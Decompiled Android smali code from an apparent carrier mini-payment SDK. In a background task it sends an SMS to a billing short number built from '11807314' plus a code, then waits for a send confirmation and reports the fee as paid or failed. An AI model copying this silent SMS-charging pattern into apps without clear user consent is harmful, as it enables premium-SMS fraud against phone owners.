.class public final Lcn/egame/terminal/miniapay/d;
.super Landroid/os/AsyncTask;


# instance fields
.field private a:Lcn/egame/terminal/miniapay/SmsBroadcastReceiver;

.field private b:Ljava/lang/String;

.field private c:Ljava/lang/String;

.field private d:Ljava/lang/String;

.field private e:Lcn/egame/terminal/miniapay/EgameFeeListener;


# direct methods
.method public constructor <init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcn/egame/terminal/miniapay/EgameFeeListener;)V
    .locals 0

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    iput-object p1, p0, Lcn/egame/terminal/miniapay/d;->b:Ljava/lang/String;

    iput-object p2, p0, Lcn/egame/terminal/miniapay/d;->c:Ljava/lang/String;

    iput-object p3, p0, Lcn/egame/terminal/miniapay/d;->d:Ljava/lang/String;

    iput-object p4, p0, Lcn/egame/terminal/miniapay/d;->e:Lcn/egame/terminal/miniapay/EgameFeeListener;

    return-void
.end method

.method private varargs a()Ljava/lang/Boolean;
    .locals 7

    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    sget-object v1, Lcn/egame/terminal/miniapay/EgameMiniApay;->context:Landroid/content/Context;

    new-instance v2, Landroid/content/Intent;

    const-string v3, "com.egame.minisdk.sent"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/4 v6, 0x0

    invoke-static {v1, v6, v2, v6}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "11807314"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcn/egame/terminal/miniapay/d;->b:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    iget-object v3, p0, Lcn/egame/terminal/miniapay/d;->c:Ljava/lang/String;

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :goto_0
    const/16 v0, 0x3c

    if-ge v6, v0, :cond_1

    :try_start_1
    sget-boolean v0, Lcn/egame/terminal/miniapay/EgameMiniApay;->SEND_SMS:Z

    if-eqz v0, :cond_0

    goto :goto_1

    :cond_0
    const-wide/16 v0, 0x3e8

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    :catch_1
    :cond_1
    :goto_1
    sget-boolean v0, Lcn/egame/terminal/miniapay/EgameMiniApay;->SEND_SMS:Z

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    return-object v0
.end method


# virtual methods
.method protected final synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    invoke-direct {p0}, Lcn/egame/terminal/miniapay/d;->a()Ljava/lang/Boolean;

    move-result-object p1

    return-object p1
.end method

.method protected final synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 2

    check-cast p1, Ljava/lang/Boolean;

    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    const/4 v0, 0x0

    sput-boolean v0, Lcn/egame/terminal/miniapay/EgameMiniApay;->FEE_LOCK:Z

    :try_start_0
    sget-object v0, Lcn/egame/terminal/miniapay/EgameMiniApay;->context:Landroid/content/Context;

    iget-object v1, p0, Lcn/egame/terminal/miniapay/d;->a:Lcn/egame/terminal/miniapay/SmsBroadcastReceiver;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    nop

    :goto_0
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcn/egame/terminal/miniapay/d;->e:Lcn/egame/terminal/miniapay/EgameFeeListener;

    iget-object v0, p0, Lcn/egame/terminal/miniapay/d;->d:Ljava/lang/String;

    invoke-interface {p1, v0}, Lcn/egame/terminal/miniapay/EgameFeeListener;->feeOk(Ljava/lang/String;)V

    return-void

    :cond_0
    iget-object p1, p0, Lcn/egame/terminal/miniapay/d;->e:Lcn/egame/terminal/miniapay/EgameFeeListener;

    const/16 v0, -0xcf

    invoke-interface {p1, v0}, Lcn/egame/terminal/miniapay/EgameFeeListener;->feeFail(I)V

    return-void
.end method

.method protected final onPreExecute()V
    .locals 4

    invoke-super {p0}, Landroid/os/AsyncTask;->onPreExecute()V

    new-instance v0, Lcn/egame/terminal/miniapay/SmsBroadcastReceiver;

    invoke-direct {v0}, Lcn/egame/terminal/miniapay/SmsBroadcastReceiver;-><init>()V

    iput-object v0, p0, Lcn/egame/terminal/miniapay/d;->a:Lcn/egame/terminal/miniapay/SmsBroadcastReceiver;

    sget-object v0, Lcn/egame/terminal/miniapay/EgameMiniApay;->context:Landroid/content/Context;

    iget-object v1, p0, Lcn/egame/terminal/miniapay/d;->a:Lcn/egame/terminal/miniapay/SmsBroadcastReceiver;

    new-instance v2, Landroid/content/IntentFilter;

    const-string v3, "com.egame.minisdk.sent"

    invoke-direct {v2, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    return-void
.end method
